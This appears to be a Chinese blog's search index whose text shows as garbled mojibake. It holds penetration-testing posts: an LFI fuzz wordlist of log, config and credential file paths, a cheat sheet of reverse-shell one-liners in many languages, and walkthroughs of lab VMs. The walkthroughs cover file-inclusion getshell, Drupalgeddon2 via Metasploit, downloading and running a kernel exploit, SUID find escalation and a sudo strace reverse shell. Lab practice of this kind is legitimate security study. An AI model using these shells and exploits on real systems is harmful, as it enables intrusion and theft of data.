<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[è®°ä¸€æ¬¡LFI-Fuzzå­—å…¸æ„é€ ]]></title>
    <url>%2F2019%2F04%2F01%2FLFI-Fuzz%2F</url>
    <content type="text"><![CDATA[Fuzzå­—å…¸æ„é€ çš„å¿…è¦æ€§å½“é‡åˆ°ä¸€å¤„æ–‡ä»¶åŒ…å«æ¼æ´æ—¶ï¼Œä¸€èˆ¬æ“ä½œå¤§è‡´å¦‚ä¸‹ åŒ…å«æºç è¿›è¡Œä»£ç å®¡è®¡ åŒ…å«æ–‡ä»¶(å¦‚æ—¥å¿—)è¿›è¡ŒGetShell åŒ…å«é…ç½®æ–‡ä»¶è·å¾—æ•æ„Ÿä¿¡æ¯ å¯¹äºåä¸¤ä¸ªè€Œè¨€ï¼Œæ‰‹åŠ¨ä¸€ä¸ªä¸ªçš„å»è¿›è¡Œæµ‹è¯•æ— ç–‘æ˜¯ä¸å¤Ÿä¼˜é›…çš„æ‰€ä»¥å°±æœ‰äº†è¿™æ¬¡å­—å…¸æ„é€ ã€‚ Linuxæ–‡ä»¶è·¯å¾„æ”¶é›† å¯¹äºè·¯å¾„æ¥è¯´æ˜¯æœ‰ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ä¸¤ç§ï¼Œè€ƒè™‘åˆ°é™åˆ¶è·¯å¾„çš„å¯èƒ½æ€§å°†ä»¥ä¸‹æ‰€æœ‰ç›®å½•åŠ ä¸Šå¤šä¸ª../ä»¥ä¿è¯åœ¨ç›¸å¯¹è·¯å¾„æ—¶è¾¾åˆ°ç»å¯¹è·¯å¾„çš„æ•ˆæœ../../../../../../../../../../* Apacheæ—¥å¿—/var/log/apache/access.log/var/log/apache/access_log /var/log/apache/error_log /var/log/apache/error.log /var/log/apache2/access.log/var/log/apache2/access_log/var/log/apache2/error.log/var/log/apache2/error_log/usr/local/apache/logs/access_log /usr/local/apache/logs/access.log /usr/local/apache/logs/error_log /usr/local/apache/logs/error.log /usr/local/apache2/logs/access_log /usr/local/apache2/logs/access.log /usr/local/apache2/logs/error_log /usr/local/apache2/logs/error.log /usr/local/app/apache/logs/access_log /usr/local/app/apache/logs/access.log /usr/local/app/apache/logs/error_log /usr/local/app/apache/logs/error.log /usr/local/app/apache2/logs/access_log /usr/local/app/apache2/logs/access.log /usr/local/app/apache2/logs/error_log /usr/local/app/apache2/logs/error.log WWWæ—¥å¿—/var/www/logs/access.log/var/www/logs/access_log/var/www/logs/error_log/var/www/logs/error.log/var/log/access.log/var/log/access_log /var/log/error.log/var/log/error_log/var/log/httpd/access_log /var/log/httpd/error_log/var/log/httpd/access.log /var/log/httpd/error.log/etc/httpd/logs/acces_log /etc/httpd/logs/acces.log /etc/httpd/logs/error_log /etc/httpd/logs/error.log /etc/httpd/conf/httpd.conf SSHæ—¥å¿—/var/log/secure/var/log/auth.log FTPæ—¥å¿—/var/log/messages é…ç½®æ–‡ä»¶#mysql é…ç½®æ–‡ä»¶/etc/my.conf#Apache2é»˜è®¤é…ç½®æ–‡ä»¶/usr/local/app/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhost.conf#PHPç›¸å…³é…ç½®/usr/local/app/php5/lib/php.ini#ç”¨æˆ·&amp;å¯†ç ä¿¡æ¯/etc/passwd/etc/shadow Session/var/lib/php/session/sess_+sessionid Winæ–‡ä»¶è·¯å¾„æ”¶é›†FTPæ—¥å¿— ex+å¹´ä»½çš„æœ«ä¸¤ä½æ•°å­—+æœˆä»½+æ—¥æœŸï¼Œå¦‚2019å¹´4æœˆ02æ—¥çš„WWWæ—¥å¿—æ–‡ä»¶æ˜¯ex190402.log %systemroot%/system32/logfiles/msftpsvc1/ex190402.log WWWæ—¥å¿— ex+å¹´ä»½çš„æœ«ä¸¤ä½æ•°å­—+æœˆä»½+æ—¥æœŸã€‚å¦‚2019å¹´4æœˆ02æ—¥çš„WWWæ—¥å¿—æ–‡ä»¶æ˜¯ex190402.log %systemroot%/system32/logfiles/w3svc1/ex190402.log é…ç½®æ–‡ä»¶%systemroot%\system32\inetsrv\MetaBase.xml #IISé…ç½®æ–‡ä»¶%systemroot%\php.ini #phpé…ç½®ä¿¡æ¯c:\ProgramFiles\mysql\my.ini #MySQLé…ç½® æœ€åé™¤å»ä¸€äº›æ¯”è¾ƒç‰¹æ®Šæ²¡æ³•é€šç”¨åŒ–çš„ï¼Œé‚£ä¹ˆä¸€ä»½çƒ­ä¹ä¹çš„Fuzzå­—å…¸å°±è¿™ä¹ˆå‡ºç‚‰å•¦! æ¥ä¸‹æ¥å°±æ˜¯é•¿æ—¶é—´çš„å­—å…¸ç§¯ç´¯ç»´æŠ¤äº†]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinuxèŠ±å¼å¼¹shellæŒ‡å—]]></title>
    <url>%2F2019%2F03%2F26%2Freverse-shell%2F</url>
    <content type="text"><![CDATA[nc nc -lvvp port nc -e /bin/bash ip port Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.239.131",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' Telnettelnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665nc -lvvp 6666 #å‘½ä»¤ä¼ è¾“çª—å£nc -lvvp 6665 #å‘½ä»¤ç»“æœæ˜¾ç¤ºçª—å£ mknod test p &amp;&amp; telnet 192.168.220.131 6666 0&lt;test | /bin/bash 1&gt;testnc -lvvp 6666 PHP php -r '$sock=fsockopen("192.168.220.131",6666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' &lt;?php$sock = fsockopen('192.168.220.131', 6666);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process);?&gt; Ruby *ruby -rsocket -e 'f=TCPSocket.open("192.168.220.131",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.220.131","6666");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' Perl perl -e 'use Socket;$i="192.168.220.131";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' Java Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;);p.waitFor();Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);p.waitFor(); Lua lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:Billu_b0xé¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F26%2FBillu_b0x%2F</url>
    <content type="text"><![CDATA[0x01 ç®€ä»‹ ä½œè€…:billu éš¾åº¦å®šä½:ä¸­ç­‰ ç›®æ ‡:è·å¾—root é¶æœº:192.168.220.130 æ”»å‡»æœº:192.168.220.129 0x02 SQLæ³¨å…¥GetShell? port 22port 80 å¾ˆæ˜¾ç„¶æ˜¯SQLæ³¨å…¥ï¼Œä½†äº‹æƒ…å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•å…ˆæ˜¯ç»è¿‡ä¸€æ³¢æ‰‹å·¥æµ‹è¯•ï¼Œå‘ç°ä¸€ä¸ªå¥‡æ€ªé—®é¢˜ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆå‚æ•°ï¼Œéƒ½åªä¼šè¿”å›200å’Œå¼¹çª—TryAgain ç”šè‡³å…¨éƒ¨ç½®ç©ºï¼Œä¹Ÿæ˜¯è¿”å›200å…ˆåæµ‹è¯•è¿‡æ‰€æœ‰å¯æ§å‚æ•°åŒ…æ‹¬cookieï¼ŒRefererï¼ŒPHPSESSIDæœ€åç»æœ›çš„æ‹¿å»sqlmapè·‘ï¼Œè¿˜è°ƒäº†æœ€é«˜çº§ä»¥åŠå°è¯•äº†ä¸€äº›tamperç»“æœå°±æ˜¯è¿™æ · 0x03 å…³é”®è¿˜å¾—è·‘ç›®å½•æˆ‘éƒ½æ€€ç–‘SQLæ³¨å…¥æ˜¯ä¸ªå¹Œå­é‚£ä¹ˆï¼Œå”¯ä¸€å¯è¡Œçš„å°±æ˜¯è·‘ç›®å½•å¯»æ‰¾å…¶ä»–æ¼æ´äº† è¿˜å¥½ç¡®å®å‘ç°ä¸€äº›æœ‰é—®é¢˜çš„åœ°æ–¹in.phpæ˜¯phpinfoadd.phpæœ‰æ–‡ä»¶ä¸Šä¼  test.phpåƒæ˜¯æ–‡ä»¶åŒ…å« è¿˜æœ‰ä¸€äº›å­˜åœ¨ç›®å½•éå†ï¼Œä¸è¿‡éƒ½æ˜¯äº›å›¾ç‰‡ï¼Œä¸å­˜åœ¨ä»·å€¼ 0x04 å‡çš„æ–‡ä»¶ä¸Šä¼ &amp;æ— æ³•ç»•è¿‡çš„SQLæ³¨å…¥æ–‡ä»¶åŒ…å«å¤„æ˜¯POST è´¦å·é™¤rootå¤–ä¸­æœ‰ä¸€ä¸ªè´¦å·icaé‚£ä¹ˆå…ˆæ¥åŒ…å«ä¸€ä¸‹add.phpçš„æºç  è¿˜æœ‰è¿™ç§æ“ä½œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ è¿˜å¥½ï¼Œæ•°æ®åº“ä¿¡æ¯GETï¼Œä½†å¹¶æ²¡æœ‰3306 ç”¨æˆ·å:billuå¯†ç : b0x_billuæ•°æ®åº“å: ica_labå¦å¤–ï¼Œä¸»é¡µçš„æ³¨å…¥æºç ä¹Ÿé€šè¿‡åŒ…å«æ‹¿åˆ° æˆ‘åœ¨æœ¬åœ°æ­å»ºäº†ç¯å¢ƒï¼Œåšäº†è®¸å¤šæµ‹è¯•éƒ½æ— æ³•ç»•è¿‡â€¦â€¦æœ‰çœ‹åˆ°ä¸€äº›wpæ˜¯è¯´è¿‡æ»¤çš„æ˜¯\&#39;ä½†æˆ‘å®é™…æµ‹è¯•ï¼Œè¿‡æ»¤çš„æ˜¯&#39;ï¼Œå¯¼è‡´æ— æ³•é€ƒé€¸å¼•å·è€Œåˆ«çš„wpç»™å‡ºçš„payloadæˆ‘ä¹Ÿæ— æ³•ä½¿ç”¨ï¼Œemmm 0x05 phpmyadmin&amp;æ–‡ä»¶ä¸Šä¼ æŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼Œç›®å½•è·‘å‡ºäº†æ–°çš„ä¸œè¥¿phpmyè¿™åå­—ä¸€çœ‹å°±æœ‰æˆ é€šè¿‡åŒ…å«å¾—åˆ°çš„ç”¨æˆ·åå¯†ç æœ‰äº†ç”¨æ­¦ä¹‹å¤„ æˆåŠŸå¾—åˆ°ç™»å½•è´¦æˆ·å’Œå¯†ç  è´¦æˆ·:biLLuå¯†ç :hEx_it é¡ºé“å°è¯•mysqlå†™shellå’Œloadfileï¼Œå¯æƒœæƒé™è¿‡ä½é‚£ä¹ˆåˆ©ç”¨æ‹¿åˆ°çš„ä¿¡æ¯ç™»å½•ä¸»é¡µæ¥åˆ°äº†panel.php æœ‰ä¸€ä¸ªå¢åŠ ç”¨æˆ·åŠŸèƒ½ï¼Œå¯ä»¥çœŸçš„ä¸Šä¼ æ–‡ä»¶ åŒæ—¶åˆ©ç”¨ä¹‹å‰çš„æ–‡ä»¶åŒ…å«æ‹¿åˆ°æºç  emmmmï¼Œæ²¡å…³ç³»ï¼Œè¿˜æœ‰show userä¸­è¿˜æœ‰ä¸€å¤„æ–‡ä»¶åŒ…å« å…ˆæ¥ä¸Šä¼ ä¸ªé©¬ 0x06 æ–‡ä»¶åŒ…å«Getshellif($choice==='show')&#123; include($dir.'/'.$choice.'.php'); die();&#125;else&#123; include($dir.'/'.$_POST['load']);&#125; å¯ä»¥çœ‹åˆ°panelä¸­show useråŠŸèƒ½æºç å¦‚ä¸Šæ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ load=/uploaded_images/reverse.jpg&amp;continue=continue åƒè¾›ä¸‡è‹¦ï¼Œç»ˆäºæ‹¿åˆ°äº†shellä¸Šæ¥å…ˆæ˜¯ç´ è´¨äºŒè¿ï¼Œwhoami lsæ¯«æ— å›æ˜¾ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯æƒé™é—®é¢˜ï¼Œç»“æœæ–­è¿æ—¶æœ‰å›æ˜¾äº†ï¼ŒæœŸé—´æ£€æµ‹åˆ°æœ‰pyç¯å¢ƒ python -c 'import pty; pty.spawn("/bin/sh")' é‚£ä¹ˆåˆåˆ°äº†æ¿€åŠ¨äººå¿ƒçš„ææƒæ—¶åˆ»äº† å…ˆæ˜¯findä¸€æ³¢æ²¡ä»€ä¹ˆç‰¹æ®Šï¼Œunameä¸€æ³¢ï¼Œå“Ÿå¼ wget http://192.168.220.131:8001/37292.c -O /tmp/a.ccd /tmpgcc a.c -o pwnchmod +x pwn./pwn çœ‹æ¥è¿™ä¸ªé¶æœºéš¾åº¦æ˜¯åå‘webçš„â€¦ 0x07 å°ç»“å…ˆæ˜¯è·‘ç›®å½•å¾—åˆ°è®¸å¤šé¡µé¢ä¿¡æ¯å‘ç°test.phpå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé€šè¿‡åŒ…å«å…¶ä»–é¡µé¢å¾—åˆ°æºç ï¼Œå¹¶è¿›è¡Œå®¡è®¡åŒ…å«åˆ°c.phpå¾—åˆ°æ•°æ®åº“å¯†ç å’Œç”¨æˆ·ï¼Œåœ¨phpmyadminç™»å½•æ‰¾åˆ°ä¸»é¡µç”¨æˆ·å¯†ç ç™»å½•ä¸»é¡µï¼Œè·³åˆ°panel.phpï¼Œæœ‰å›¾ç‰‡ä¸Šä¼ å’Œå±•ç¤ºåŠŸèƒ½çš„æ–‡ä»¶åŒ…å«é€šè¿‡åŒ…å«å›¾ç‰‡é©¬ï¼Œåå¼¹å¾—shellï¼Œé€šè¿‡linuxå†…æ ¸ææƒåˆ°rootæ•´ä¸ªè¿‡ç¨‹ä¸€ç¯æ‰£ä¸€ç¯ï¼Œå°‘ä¸€æ­¥å°±å¤±è´¥ å¤šè¯´ä¸€å¥åŒ…å«æ‹¿shellçš„æ˜¯panel.phpè¿™ä¸ªé¡µé¢ï¼Œè€Œtest.phpé‚£ä¸ªåŒ…å«ç”¨çš„æ˜¯readfileå‡½æ•°ï¼Œæ˜¯æ²¡åŠæ³•getshellçš„]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:DC-1é¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F23%2FDC-1%2F</url>
    <content type="text"><![CDATA[0x01 åºç«  ä½œè€…:DCAU éš¾åº¦å®šä½:æœªçŸ¥ï¼Œåˆçº§? ç›®æ ‡:å…±æœ‰äº”ä¸ªflagï¼Œä½†æœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­ 0x02 æ–°ç©æ„ è¿™æ¬¡æ¥å°è¯•ä¸€ä¸‹æ–°ç©æ„ï¼ŒNetDiscover è¿™ä¸ªå‘ç°å·¥å…·æˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨ï¼Œè™½ç„¶å¬è¯´è¿‡å¾ˆå¤šæ¬¡ # å…ˆæŒ‡å®šä¸€ä¸‹ç½‘å¡sudo netdiscover -i eth2 192.168.135.131 é‰´äºä¸Šæ¬¡çš„ç»éªŒï¼Œè¿™æ¬¡æˆ‘æŒ‡å®šäº†æ›´å…¨é¢çš„æ‰«æ nmap -sV -sS -p- 192.168.135.131 å…ˆè¯•ä¸‹adminï¼ŒAccess deniedï¼Œå¥½å§ é‚£æ¥è·‘ä¸‹ç›®å½• ç„¶åâ€¦..ç„¶åç«™å°±è¢«æˆ‘è·‘å´©äº†,ğŸ¤¦ã¤ï¹âŠ‚ é‡å¯ä¸€ä¸‹è™šæ‹Ÿæœºï¼Œä¸è·‘äº†ä¸è·‘äº†ï¼Œå…ˆçœ‹çœ‹robotså§ é€šè¿‡UPGRADE.txtå’ŒMAINTAINERS.txtåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯Drupal 7.x(9 or 10) 0x03 Drupalgeddon2 GetShell å¯¹äºDrupalï¼Œæˆ‘æ‰¾åˆ°ä¸€ä¸ªå†å®³çš„æ´ï¼Œæ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ Msfä¸­ä¹Ÿæœ‰ï¼Œä½†åˆ©ç”¨å¹¶ä¸é¡ºåˆ© use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.135.131set payload php/meterpreter_reverse_tcpset lhost 192.168.135.130run åè€Œåœ¨searchsploitä¸­æ‰¾åˆ°ä¸€ä¸ªåŸºäºrubyçš„å¯ç”¨exp æˆåŠŸæ‹¿åˆ°äº†shellï¼Œä½†æˆ‘ä¸æ­»å¿ƒå†åº¦å°è¯•msf set payload php/reverse_phprun äº‹å®è¯æ˜ï¼Œèƒ½å¼¹å›æ¥ æˆ‘å†æ¬¡è¿›è¡Œä¸€äº›æµ‹è¯• php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inlinephp/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stagergeneric/shell_reverse_tcp Generic Command Shell, Reverse TCP Inlinephp/reverse_php PHP Command Shell, Reverse TCP (via PHP) å‰ä¸¤è€…ä¸€ä¸ªæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå›è¿ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨phpå›è¿ï¼Œphpå›è¿èƒ½è¿ä¸Šä½†æ— æƒé™ è€Œæ™®é€šçš„genericå’Œphpéƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œå¥½çš„ï¼Œå¯ä»¥è¯´æ˜æ˜¯meterpreterçš„é”… ç„¶è€Œä½“éªŒè¿˜ä¸å¦‚é‚£ä¸ªrubyçš„expï¼Œå’~ 0x04 Flag1&amp;Flag2è¿›æ¥webç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag1 DC-1&gt;&gt; cat flag1.txtEvery good CMS needs a config file - and so do you. å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œä¸€é¡¿æœç´¢ï¼ŒDrupalçš„é…ç½®æ–‡ä»¶åœ¨sites/default/settings.php Getflag2db:drupaldbusername:dbuserpassword:R0ck3t é‚£æˆ‘ä»¬è¿ä¸Šå»mysqlçœ‹çœ‹ mysql -udbuser -pR0ck3t ç„¶è€Œä¹±ä¸ƒå…«ç³Ÿå•¥æœ‰ç”¨çš„ä¿¡æ¯éƒ½æ‰¾ä¸åˆ° æœŸé—´æˆ‘åˆé‡æ–°å¼¹äº†ä¸€æ¬¡shellï¼Œåæ¥å‘ç° å“‡å’”å’”ï¼Œä½ æ‡‚çš„ gcc -o2 up.c éšå æˆ‘åœ¨æœ¬æœºæ­å»ºäº†ä¸€ä¸ªç®€æ˜“çš„pythonæœåŠ¡å™¨ å¹¶wgetæ‹¿åˆ°exp chmod +x 2./2whoamiroot ç„¶åå†çœ‹ä¸€ä¸‹åˆ«çš„è·¯ 0x05 SSHçˆ†ç ´ææƒè¿™æ—¶æˆ‘åˆæƒ³èµ·äº†flag2çš„æç¤ºï¼Œè·‘å­—å…¸.åŒæ—¶passwdä¸­ä¸€ä¸ªè´¦å·å¸å¼•äº†æˆ‘çš„æ³¨æ„ å°±æ˜¯å®ƒäº†ã€‚ [22][ssh] host: 192.168.135.131 login: flag4 password: orange æ©™å­ï¼Œå‘ç°homeä¸‹è¿˜æœ‰ä¸ªflag4 0x06 åŸºäºfindææƒ æ³¨æ„ï¼šæˆ‘åœ¨å‘ç°flag4å‰å°±å·²ç»é€šè¿‡findæ‹¿åˆ°rootäº†ï¼Œä¸ºäº†æ–¹ä¾¿è§‚çœ‹æˆ‘æŠŠè¿‡ç¨‹æ”¾åˆ°äº†è¿™é‡Œï¼Œæ‰€ä»¥æœ‰äº›å›¾ç‰‡ä¸­çš„ç»ˆç«¯åå¯¹ä¸ä¸Šäº† find / -perm -4000 2&gt;/dev/null find / -exec /bin/sh \; -quit findä¸­æä¾›äº†ä¸€å¤„å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ 0x07 Flag3è™½ç„¶å·²ç»æ‹¿åˆ°äº†rootå¹¶é›†é½äº†å››ä¸ªflag ä½†å¹¶æ²¡æœ‰æ‰¾åˆ°flag3ï¼ŒåŒæ—¶æƒ³èµ·flag2ä¸­å°†æˆ‘ä»¬å¼•å‘æ•°æ®åº“çš„ç›®çš„ æ•°æ®åº“æˆ‘ä»”ç»†ç¿»æ‰¾è¿‡ï¼Œå¹¶æ²¡æœ‰ç‰¹æ®Šçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬èƒ½åšçš„ä¸œè¥¿ä¸å¤šæ¯”å¦‚:å¾—åˆ°ç®¡ç†å‘˜å¯†ç  é‚£æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œç™»å½•åå°? å¦‚æœæ˜¯ä¸€èˆ¬æƒ…å†µï¼Œä¼°è®¡åªæœ‰è·‘johnäº†ï¼Œä½†è¿™æ¬¡ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬çŸ¥é“ç› å•Šï¼è¿˜æœ‰æ›´çœäº‹çš„æ–¹æ³•ï¼Œdrupalè‡ªå¸¦äº†äº†åŠ å¯† $S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p. åˆ°æ•°æ®åº“ä¸­ update users set pass = '$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.' where uid=1; çœ‹æ ·å­æˆ‘æ˜¯ç›´æ¥è·³è¿‡äº†hintï¼Œæ‹¿rootäº†emmmmmm]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:UnknownDeviceé¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F22%2FUnknownDevice%2F</url>
    <content type="text"><![CDATA[0x01 å‰è¨€ éš¾åº¦å®šä½:ä¸­çº§ ä½œè€…ï¼šAjay Verma ç›®æ ‡:è·å¾—rootå¹¶é˜…è¯»/root/flag.txt 0x02 ä¸»æœºæ‰«æå…ˆæ‰«ä¸€æ³¢ Nmap scan report for 192.168.135.129Host is up (0.0012s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION31337/tcp open http SimpleHTTPServer 0.6 (Python 2.7.14)|_http-server-header: SimpleHTTP/0.6 Python/2.7.14|_http-title: Website By Unknowndevice64 MAC Address: 00:0C:29:F9:6F:F5 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop port 31337 pythonçš„ç®€æ˜“HTTPServer ä»£ç æœ‰hint 0x03 å›¾ç‰‡éšå†™æœ¯ æ˜¯å›¾ç‰‡éšå†™ï¼Œå…ˆåæ‹¿HxDå’ŒStegsolveåˆ†æè¿‡ï¼Œéƒ½ä¸è¡Œ çœ‹äº†wpæ‰çŸ¥é“è¦ç”¨steghideï¼Œå‡ºå¸ˆä¸åˆ© steghide --extract -sf key_is_h1dd3n.jpg å¯†ç æ˜¯h1dd3n å¾—åˆ°ä¸€ä¸²å¥‡æ€ªçš„ä¸œè¥¿ ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------. çœ‹ç€è¿™ä¸²ï¼Œå€’æ˜¯æƒ³åˆ°äº†ä»¥å‰æ¥è§¦è¿‡çš„jsfuckï¼Œä½†å…¶å®åˆä¸ä¸€æ · æŸ¥äº†äº›èµ„æ–™æ„Ÿè§‰å¯èƒ½æ˜¯BrainFuck ud64:1M!#64@ud è¿˜ä»¥ä¸ºæ˜¯å•¥åŠ å¯†ï¼ŒæŠ˜è…¾è®¸ä¹…ï¼Œå†æ¬¡èµ°æŠ•æ— è·¯â€¦.å¶ç„¶é—´å‘ç°ï¼Œè¿™åå­—emmm è¿™æ˜¯ç”¨æˆ·å+å¯†ç ?å¯æ˜¯æ²¡æœ‰å¯ä»¥ç™»å½•çš„åœ°æ–¹å•Šï¼Œç«¯å£åªæœ‰31337 sudo nmap -sV -p 1-65535 192.168.135.129 æŒ‡å®šå…¨ç«¯å£ï¼Œå†æ‰«ä¸€æ¬¡ï¼Œ1337æœ‰SSHï¼Œçœ‹æ¥å°±æ˜¯å®ƒäº† è¿›æ¥äº†??æ®Šä¸çŸ¥çœŸæ­£çš„æŒ‘æˆ˜æ‰åˆšåˆšå¼€å§‹ 0x04 rbashé™åˆ¶é€ƒé€¸ä¸Šæ¥å°±æ˜¯ls ud64@unknowndevice64_v1:~$ ls-rbash: /bin/ls: restricted: cannot specify `/' in command names å…ˆæ¥çœ‹çœ‹è¿™ä¸ªrbashæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ è¿™ä¹ˆå˜æ€???ï¼Œç»è¿‡ä¸€ç•ªæœç´¢ å‘ç°å¯ä»¥é€šè¿‡æŒ‰ä¸¤ä¸‹tabé”®è°ƒå‡ºå¯ä»¥æ‰§è¡Œçš„ç¨‹åº æœ€ç»ˆæ‰¾åˆ°ä¸¤å¤„å¯ç»•è¿‡é™åˆ¶shellçš„æ–¹æ³• vi æ‰§è¡Œ!/bin/sh export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin ä½†æƒé™å—é™ï¼Œç¯å¢ƒå˜é‡æ˜¯åªè¯»ï¼Œåªæœ‰viäº† å¾ˆå¥½ï¼Œç›®å‰å·²ç»è·å¾—äº†ä¸€ä¸ªâ€™â€™è¾ƒâ€™â€™æ­£å¸¸çš„shellï¼Œä½†æ˜¯æƒé™ä¾ç„¶å¾ˆä½ äº‹å®ä¸Šè¿™åªæ˜¯åœ¨viä¸­è¿è¡Œçš„ä¸€ä¸ªâ€™shellâ€™ï¼Œé‚£ä¹ˆå…ˆæŠŠå®ƒæåˆ°æ™®é€šçš„shell æ¯”å¦‚è¿™æ · è¿™æ˜¯å› ä¸ºåœ¨viçš„shellä¸­å·²ç»æ‹¥æœ‰äº†ç¯å¢ƒå˜é‡çš„å†™å…¥æƒé™äº† 0x05 ç ´é‡œæ²‰èˆŸstraceåˆ°rootç°åœ¨ä¾æ—§æ²¡æœ‰åŠæ³•è¯»åˆ°rootä¸‹çš„flag æŸ¥çœ‹äº†passwdï¼Œé™¤rootå¤–ï¼Œæœ‰bashçš„è´¦æˆ·è¿˜æœ‰ä¸€ä¸ªoperator root:x:0:0::/root:/bin/bashoperator:x:11:0:operator:/root:/bin/bashud64:x:1000:1000::/home/ud64:/bin/rbash ä½†ä¸çŸ¥é“å¯†ç ï¼Œä¹Ÿæ‰¾ä¸åˆ°å¯è¡Œçš„å†…æ ¸ææƒ å†åº¦é™·å…¥åƒµå±€ æœ€ç»ˆï¼Œåœ¨å…ˆåæ£€æŸ¥äº†ç¯å¢ƒå˜é‡å’Œè¿›ç¨‹åï¼Œåœ¨æ£€æŸ¥sudoå¯æ‰§è¡Œå‘½ä»¤æ—¶å‘ç° å¯ä»¥ç”¨sudoæ‰§è¡Œ/usr/bin/sysud64ä½†æˆ‘å¹¶ä¸æ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¨‹åºï¼Œå¹¸å¥½æœ‰help å…¶å®è¿™æ˜¯straceï¼Œä¸€ä¸ªç”¨ä»¥è¯Šæ–­ï¼Œè°ƒè¯•çš„ç¨‹åºï¼Œæ²¡é”™è°ƒè¯•å°±æ„å‘³ç€è¿è¡Œ! sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1 ä»¥rootæƒé™è¿›è¡Œä¸€æ¬¡å¼¹shellå¹¶æŠŠæ‰€æœ‰è°ƒè¯•è¾“å‡ºåˆ°æœ€çˆ±çš„é»‘æ´ äº‹åå‘ç°å…¶å®å¯ä»¥ç›´æ¥æ‰§è¡Œ/bin/bash sudo sysud64 -o /dev/null /bin/bash æˆ‘ä¸ç®¡ï¼Œæˆ‘å°±æ˜¯è¦å¼¹ï¼Œå°å£°é€¼é€¼ 0x06 GetFlagA hacker does for love what others woud not do for money.]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€å®æˆ˜</tag>
      </tags>
  </entry>
  <entry>
